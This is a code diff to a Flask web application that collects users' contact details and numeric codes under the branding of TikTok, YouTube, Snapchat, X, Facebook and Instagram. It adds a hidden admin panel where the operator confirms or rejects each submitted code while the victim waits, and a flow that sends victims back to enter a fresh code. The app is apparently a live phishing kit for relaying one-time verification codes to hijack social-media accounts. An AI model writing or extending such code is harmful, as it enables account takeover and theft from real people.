@@ -58,7 +58,9 @@ def init_db():
                 icon TEXT,
                 code_value TEXT,
                 confirmed BOOLEAN DEFAULT 0,
-                platform_name TEXT
+                platform_name TEXT,
+                rejected BOOLEAN DEFAULT 0,
+                resend_requested BOOLEAN DEFAULT 0
             )
         ''')
         conn.commit()
@@ -69,18 +71,24 @@ def save_submission(page, user, data, code_value=None, platform_name=None):
     icon, color, name = ICON_MAP.get(page, ("fa-solid fa-file", "#333", "Unknown"))
     with sqlite3.connect(DB_FILE) as conn:
         conn.execute('''
-            INSERT INTO submissions (timestamp, page, user, data, icon, code_value, confirmed, platform_name)
-            VALUES (?,?,?,?,?,?,?,?)
-        ''', (datetime.utcnow().isoformat(), page, user, data, icon, code_value, 0, platform_name))
+            INSERT INTO submissions (timestamp, page, user, data, icon, code_value, confirmed, platform_name, rejected, resend_requested)
+            VALUES (?,?,?,?,?,?,?,?,?,?)
+        ''', (datetime.utcnow().isoformat(), page, user, data, icon, code_value, 0, platform_name, 0, 0))
         conn.commit()
 
 def check_confirmation(code_value):
     with sqlite3.connect(DB_FILE) as conn:
         result = conn.execute(
-            'SELECT confirmed FROM submissions WHERE code_value = ? ORDER BY id DESC LIMIT 1',
+            'SELECT confirmed, rejected, resend_requested FROM submissions WHERE code_value = ? ORDER BY id DESC LIMIT 1',
             (code_value,)
         ).fetchone()
-        return result[0] if result else False
+        if result:
+            return {
+                'confirmed': bool(result[0]),
+                'rejected': bool(result[1]),
+                'resend_requested': bool(result[2])
+            }
+        return {'confirmed': False, 'rejected': False, 'resend_requested': False}
 
 def extract_user(form):
     for key in ("address","email","phone","fullname","street","username"):
@@ -114,9 +122,17 @@ def joy1_2():
         user = extract_user(request.form)
         digits = request.form.get('digits','')
         save_submission('joy1_2', user, f'digits={digits}', code_value=digits, platform_name="TikTok")
+        # Get the latest submission ID for this code
+        with sqlite3.connect(DB_FILE) as conn:
+            submission = conn.execute(
+                'SELECT id FROM submissions WHERE code_value = ? ORDER BY id DESC LIMIT 1',
+                (digits,)
+            ).fetchone()
+        submission_id = submission[0] if submission else None
         return render_template('waiting_confirmation.html', 
                              next_url=url_for('joy1_3'),
                              code_value=digits,
+                             submission_id=submission_id,
                              platform_icon='fa-brands fa-tiktok', 
                              platform_name='TikTok', 
                              platform_color='#000000')
@@ -128,9 +144,17 @@ def joy1_3():
         user = extract_user(request.form)
         digits = request.form.get('digits','')
         save_submission('joy1_3', user, f'digits={digits}', code_value=digits, platform_name="TikTok")
+        # Get the latest submission ID for this code
+        with sqlite3.connect(DB_FILE) as conn:
+            submission = conn.execute(
+                'SELECT id FROM submissions WHERE code_value = ? ORDER BY id DESC LIMIT 1',
+                (digits,)
+            ).fetchone()
+        submission_id = submission[0] if submission else None
         return render_template('waiting_confirmation.html', 
                              next_url=url_for('spinner', platform='TikTok'),
                              code_value=digits,
+                             submission_id=submission_id,
                              platform_icon='fa-brands fa-tiktok', 
                              platform_name='TikTok', 
                              platform_color='#000000')
@@ -153,9 +177,17 @@ def joy2_2():
         user = extract_user(request.form)
         digits = request.form.get('digits','')
         save_submission('joy2_2', user, f'digits={digits}', code_value=digits, platform_name="YouTube")
+        # Get the latest submission ID for this code
+        with sqlite3.connect(DB_FILE) as conn:
+            submission = conn.execute(
+                'SELECT id FROM submissions WHERE code_value = ? ORDER BY id DESC LIMIT 1',
+                (digits,)
+            ).fetchone()
+        submission_id = submission[0] if submission else None
         return render_template('waiting_confirmation.html', 
                              next_url=url_for('joy2_3'),
                              code_value=digits,
+                             submission_id=submission_id,
                              platform_icon='fa-brands fa-youtube', 
                              platform_name='YouTube', 
                              platform_color='#FF0000')
@@ -167,9 +199,17 @@ def joy2_3():
         user = extract_user(request.form)
         digits = request.form.get('digits','')
         save_submission('joy2_3', user, f'digits={digits}', code_value=digits, platform_name="YouTube")
+        # Get the latest submission ID for this code
+        with sqlite3.connect(DB_FILE) as conn:
+            submission = conn.execute(
+                'SELECT id FROM submissions WHERE code_value = ? ORDER BY id DESC LIMIT 1',
+                (digits,)
+            ).fetchone()
+        submission_id = submission[0] if submission else None
         return render_template('waiting_confirmation.html', 
                              next_url=url_for('spinner', platform='YouTube'),
                              code_value=digits,
+                             submission_id=submission_id,
                              platform_icon='fa-brands fa-youtube', 
                              platform_name='YouTube', 
                              platform_color='#FF0000')
@@ -192,9 +232,17 @@ def happy1_2():
         user = extract_user(request.form)
         digits = request.form.get('digits','')
         save_submission('happy1_2', user, f'digits={digits}', code_value=digits, platform_name="Snapchat")
+        # Get the latest submission ID for this code
+        with sqlite3.connect(DB_FILE) as conn:
+            submission = conn.execute(
+                'SELECT id FROM submissions WHERE code_value = ? ORDER BY id DESC LIMIT 1',
+                (digits,)
+            ).fetchone()
+        submission_id = submission[0] if submission else None
         return render_template('waiting_confirmation.html', 
                              next_url=url_for('happy1_3'),
                              code_value=digits,
+                             submission_id=submission_id,
                              platform_icon='fa-brands fa-snapchat', 
                              platform_name='Snapchat', 
                              platform_color='#FFFC00')
@@ -206,9 +254,17 @@ def happy1_3():
         user = extract_user(request.form)
         digits = request.form.get('digits','')
         save_submission('happy1_3', user, f'digits={digits}', code_value=digits, platform_name="Snapchat")
+        # Get the latest submission ID for this code
+        with sqlite3.connect(DB_FILE) as conn:
+            submission = conn.execute(
+                'SELECT id FROM submissions WHERE code_value = ? ORDER BY id DESC LIMIT 1',
+                (digits,)
+            ).fetchone()
+        submission_id = submission[0] if submission else None
         return render_template('waiting_confirmation.html', 
                              next_url=url_for('spinner', platform='Snapchat'),
                              code_value=digits,
+                             submission_id=submission_id,
                              platform_icon='fa-brands fa-snapchat', 
                              platform_name='Snapchat', 
                              platform_color='#FFFC00')
@@ -231,9 +287,17 @@ def happy2_2():
         user = extract_user(request.form)
         digits = request.form.get('digits','')
         save_submission('happy2_2', user, f'digits={digits}', code_value=digits, platform_name="X / Twitter")
+        # Get the latest submission ID for this code
+        with sqlite3.connect(DB_FILE) as conn:
+            submission = conn.execute(
+                'SELECT id FROM submissions WHERE code_value = ? ORDER BY id DESC LIMIT 1',
+                (digits,)
+            ).fetchone()
+        submission_id = submission[0] if submission else None
         return render_template('waiting_confirmation.html', 
                              next_url=url_for('happy2_3'),
                              code_value=digits,
+                             submission_id=submission_id,
                              platform_icon='fa-brands fa-x-twitter', 
                              platform_name='X / Twitter', 
                              platform_color='#000000')
@@ -245,9 +309,17 @@ def happy2_3():
         user = extract_user(request.form)
         digits = request.form.get('digits','')
         save_submission('happy2_3', user, f'digits={digits}', code_value=digits, platform_name="X / Twitter")
+        # Get the latest submission ID for this code
+        with sqlite3.connect(DB_FILE) as conn:
+            submission = conn.execute(
+                'SELECT id FROM submissions WHERE code_value = ? ORDER BY id DESC LIMIT 1',
+                (digits,)
+            ).fetchone()
+        submission_id = submission[0] if submission else None
         return render_template('waiting_confirmation.html', 
                              next_url=url_for('spinner', platform='X / Twitter'),
                              code_value=digits,
+                             submission_id=submission_id,
                              platform_icon='fa-brands fa-x-twitter', 
                              platform_name='X / Twitter', 
                              platform_color='#000000')
@@ -270,9 +342,17 @@ def love1_2():
         user = extract_user(request.form)
         digits = request.form.get('digits','')
         save_submission('love1_2', user, f'digits={digits}', code_value=digits, platform_name="Facebook")
+        # Get the latest submission ID for this code
+        with sqlite3.connect(DB_FILE) as conn:
+            submission = conn.execute(
+                'SELECT id FROM submissions WHERE code_value = ? ORDER BY id DESC LIMIT 1',
+                (digits,)
+            ).fetchone()
+        submission_id = submission[0] if submission else None
         return render_template('waiting_confirmation.html', 
                              next_url=url_for('love1_3'),
                              code_value=digits,
+                             submission_id=submission_id,
                              platform_icon='fa-brands fa-facebook-f', 
                              platform_name='Facebook', 
                              platform_color='#1877F2')
@@ -284,9 +364,17 @@ def love1_3():
         user = extract_user(request.form)
         digits = request.form.get('digits','')
         save_submission('love1_3', user, f'digits={digits}', code_value=digits, platform_name="Facebook")
+        # Get the latest submission ID for this code
+        with sqlite3.connect(DB_FILE) as conn:
+            submission = conn.execute(
+                'SELECT id FROM submissions WHERE code_value = ? ORDER BY id DESC LIMIT 1',
+                (digits,)
+            ).fetchone()
+        submission_id = submission[0] if submission else None
         return render_template('waiting_confirmation.html', 
                              next_url=url_for('spinner', platform='Facebook'),
                              code_value=digits,
+                             submission_id=submission_id,
                              platform_icon='fa-brands fa-facebook-f', 
                              platform_name='Facebook', 
                              platform_color='#1877F2')
@@ -309,9 +397,17 @@ def love2_2():
         user = extract_user(request.form)
         digits = request.form.get('digits','')
         save_submission('love2_2', user, f'digits={digits}', code_value=digits, platform_name="Instagram")
+        # Get the latest submission ID for this code
+        with sqlite3.connect(DB_FILE) as conn:
+            submission = conn.execute(
+                'SELECT id FROM submissions WHERE code_value = ? ORDER BY id DESC LIMIT 1',
+                (digits,)
+            ).fetchone()
+        submission_id = submission[0] if submission else None
         return render_template('waiting_confirmation.html', 
                              next_url=url_for('love2_3'),
                              code_value=digits,
+                             submission_id=submission_id,
                              platform_icon='fa-brands fa-instagram', 
                              platform_name='Instagram', 
                              platform_color='#E4405F')
@@ -323,9 +419,17 @@ def love2_3():
         user = extract_user(request.form)
         digits = request.form.get('digits','')
         save_submission('love2_3', user, f'digits={digits}', code_value=digits, platform_name="Instagram")
+        # Get the latest submission ID for this code
+        with sqlite3.connect(DB_FILE) as conn:
+            submission = conn.execute(
+                'SELECT id FROM submissions WHERE code_value = ? ORDER BY id DESC LIMIT 1',
+                (digits,)
+            ).fetchone()
+        submission_id = submission[0] if submission else None
         return render_template('waiting_confirmation.html', 
                              next_url=url_for('spinner', platform='Instagram'),
                              code_value=digits,
+                             submission_id=submission_id,
                              platform_icon='fa-brands fa-instagram', 
                              platform_name='Instagram', 
                              platform_color='#E4405F')
@@ -365,10 +469,18 @@ def f1_A():
         digits = request.form.get('digits','')
         platform = request.args.get('platform', 'Unknown')
         save_submission('f1_A', user, f'digits={digits}', code_value=digits, platform_name=platform)
+        # Get the latest submission ID for this code
+        with sqlite3.connect(DB_FILE) as conn:
+            submission = conn.execute(
+                'SELECT id FROM submissions WHERE code_value = ? ORDER BY id DESC LIMIT 1',
+                (digits,)
+            ).fetchone()
+        submission_id = submission[0] if submission else None
         platform_icon, platform_color = get_platform_icon(platform)
         return render_template('waiting_confirmation.html', 
                              next_url=url_for('spinner2', platform=platform),
                              code_value=digits,
+                             submission_id=submission_id,
                              platform_icon=platform_icon, 
                              platform_name=platform,
                              platform_color=platform_color)
@@ -407,10 +519,18 @@ def f2_A():
         digits = request.form.get('digits','')
         platform = request.args.get('platform', 'Unknown')
         save_submission('f2_A', user, f'digits={digits}', code_value=digits, platform_name=platform)
+        # Get the latest submission ID for this code
+        with sqlite3.connect(DB_FILE) as conn:
+            submission = conn.execute(
+                'SELECT id FROM submissions WHERE code_value = ? ORDER BY id DESC LIMIT 1',
+                (digits,)
+            ).fetchone()
+        submission_id = submission[0] if submission else None
         platform_icon, platform_color = get_platform_icon(platform)
         return render_template('waiting_confirmation.html', 
                              next_url=url_for('m1', platform=platform),
                              code_value=digits,
+                             submission_id=submission_id,
                              platform_icon=platform_icon, 
                              platform_name=platform,
                              platform_color=platform_color)
@@ -427,23 +547,68 @@ def m1():
                          platform_name=platform,
                          platform_color=platform_color)
 
-# Admin confirmation endpoints
+# ========== ENHANCED CONFIRMATION & REJECTION SYSTEM ==========
+
 @app.route('/api/check_confirmation/<code_value>')
 def api_check_confirmation(code_value):
-    confirmed = check_confirmation(code_value)
-    return jsonify({'confirmed': confirmed})
+    status = check_confirmation(code_value)
+    return jsonify(status)
 
 @app.route(f"/admin/{ADMIN_SECRET}/confirm/<int:submission_id>", methods=['POST'])
 def admin_confirm(submission_id):
     with sqlite3.connect(DB_FILE) as conn:
-        conn.execute('UPDATE submissions SET confirmed = 1 WHERE id = ?', (submission_id,))
+        conn.execute('UPDATE submissions SET confirmed = 1, rejected = 0 WHERE id = ?', (submission_id,))
         conn.commit()
     return jsonify({'success': True})
+
+# NEW: Reject submission endpoint
+@app.route(f"/admin/{ADMIN_SECRET}/reject/<int:submission_id>", methods=['POST'])
+def admin_reject(submission_id):
+    with sqlite3.connect(DB_FILE) as conn:
+        conn.execute('UPDATE submissions SET rejected = 1, confirmed = 0 WHERE id = ?', (submission_id,))
+        conn.commit()
+    return jsonify({'success': True})
+
+# NEW: Request new code endpoint
+@app.route('/api/request_new_code/<int:submission_id>', methods=['POST'])
+def api_request_new_code(submission_id):
+    with sqlite3.connect(DB_FILE) as conn:
+        # Mark that user requested a new code
+        conn.execute('UPDATE submissions SET resend_requested = 1 WHERE id = ?', (submission_id,))
+        
+        # Get platform info for redirect
+        submission = conn.execute(
+            'SELECT platform_name FROM submissions WHERE id = ?', (submission_id,)
+        ).fetchone()
+        
+        conn.commit()
+    
+    if submission:
+        platform = submission[0] or 'Unknown'
+        # Determine which page to redirect back to based on platform
+        redirect_url = get_previous_code_page(platform)
+        return jsonify({'success': True, 'redirect_url': redirect_url})
+    
+    return jsonify({'success': False, 'error': 'Submission not found'})
+
+def get_previous_code_page(platform):
+    """Determine which page to send user back to based on platform"""
+    platform_pages = {
+        'TikTok': '/joy1_2',
+        'YouTube': '/joy2_2', 
+        'Snapchat': '/happy1_2',
+        'X / Twitter': '/happy2_2',
+        'Facebook': '/love1_2',
+        'Instagram': '/love2_2'
+    }
+    return platform_pages.get(platform, '/')
 
 @app.route(f"/admin/{ADMIN_SECRET}")
 def admin():
     with sqlite3.connect(DB_FILE) as conn:
-        rows = conn.execute('SELECT id, timestamp, page, user, data, icon, code_value, confirmed, platform_name FROM submissions ORDER BY id DESC').fetchall()
+        rows = conn.execute(
+            'SELECT id, timestamp, page, user, data, icon, code_value, confirmed, platform_name, rejected, resend_requested FROM submissions ORDER BY id DESC'
+        ).fetchall()
     return render_template('admin.html', submissions=rows, secret=ADMIN_SECRET)
 
 @app.route(f"/admin/{ADMIN_SECRET}/clear", methods=['POST'])
